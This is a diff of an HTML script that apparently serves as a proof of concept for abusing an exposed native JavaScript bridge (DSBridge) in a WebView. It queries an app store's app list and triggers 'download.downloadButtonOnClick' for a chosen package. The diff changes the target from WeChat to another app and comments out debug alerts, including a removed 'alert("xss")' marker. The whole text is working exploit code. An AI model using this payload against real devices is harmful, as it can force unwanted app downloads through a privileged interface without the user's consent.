@@ -1,7 +1,5 @@
 <script>
-
-  // alert("xss");
-                    var input = {"data":{"appKey":1,"packageName":"com.tencent.mm"},"_dscbstub":"dscb3"};
+                    var input = {"data":{"appKey":1,"packageName":"com.bytxmt.banyuetan"},"_dscbstub":"dscb3"};
                 var _handleMessageFromNative = function(p1){
 
                           // get appKey
@@ -9,17 +7,15 @@
                           var obj = JSON.parse(dataArray[0]);
                           var newAppKey = obj.appKey;
                         input.data.appKey = newAppKey;
-                         alert(newAppKey);
+                         //alert(newAppKey);
                 }
                 _dsbridge.call("_dsb.dsinit",JSON.stringify({"data":null}));
 
-                _dsbridge.call("download.queryAppList",JSON.stringify({"data":{"pkgNameList":"com.tencent.mm","pagingQueryId":"pagingQueryId"},"_dscbstub":"dscb2"}));
+                _dsbridge.call("download.queryAppList",JSON.stringify({"data":{"pkgNameList":"com.bytxmt.banyuetan","pagingQueryId":"pagingQueryId"},"_dscbstub":"dscb2"}));
                 setTimeout(function() {
                           //download
-                          alert(input.data.appKey);
-                          alert(JSON.stringify(input));
+                          //alert(input.data.appKey);
+                          //alert(JSON.stringify(input));
                   _dsbridge.call("download.downloadButtonOnClick",JSON.stringify(input));
-                }, 1000); 
-
-
+                }, 1000);     
 </script>
